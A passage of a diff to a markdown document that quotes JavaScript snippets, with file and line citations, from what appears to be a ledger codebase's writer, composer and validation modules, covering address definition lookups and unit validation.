-				total = 0;
-			if (typeof total !== 'number')
-				throw Error("mc outputs total is not a number");
-			callbacks.ifOk(total);
-		}
-	);
-}
+			if (err)
+				return callbacks.ifError(err);
 ```
 
-**File:** writer.js (L378-384)
+**File:** composer.js (L891-904)
 ```javascript
-									case "headers_commission":
-									case "witnessing":
-										var table = type + "_outputs";
-										conn.addQuery(arrQueries, "UPDATE "+table+" SET is_spent=1 \n\
-											WHERE main_chain_index>=? AND main_chain_index<=? AND +address=?", 
-											[from_main_chain_index, to_main_chain_index, address]);
-										break;
+					if (rows.length === 0) // first message from this address
+						return setDefinition();
+					// try to find last stable change of definition, then check if the definition was already disclosed
+					conn.query(
+						"SELECT definition \n\
+						FROM address_definition_changes CROSS JOIN units USING(unit) LEFT JOIN definitions USING(definition_chash) \n\
+						WHERE address=? AND is_stable=1 AND sequence='good' AND main_chain_index<=? \n\
+						ORDER BY main_chain_index DESC LIMIT 1", 
+						[from_address, last_ball_mci],
+						function(rows){
+							if (rows.length === 0) // no definition changes at all
+								return cb2();
+							var row = rows[0];
+							row.definition ? cb2() : setDefinition(); // if definition not found in the db, add it into the json
+```
+
+**File:** validation.js (L1022-1037)
+```javascript
+		storage.readDefinitionByAddress(conn, objAuthor.address, objValidationState.last_ball_mci, {
+			ifDefinitionNotFound: function(definition_chash){
+				storage.readAADefinition(conn, objAuthor.address, function (arrAADefinition) {
+					if (arrAADefinition)
+						return callback(createTransientError("will not validate unit signed by AA"));
+					findUnstableInitialDefinition(definition_chash, function (arrDefinition) {
+						if (!arrDefinition)
+							return callback("definition " + definition_chash + " bound to address " + objAuthor.address + " is not defined");
+						bInitialDefinition = true;
+						validateAuthentifiers(arrDefinition);
+					});
+				});
+			},
+			ifFound: function(arrAddressDefinition){
+				validateAuthentifiers(arrAddressDefinition);
+			}
 ```
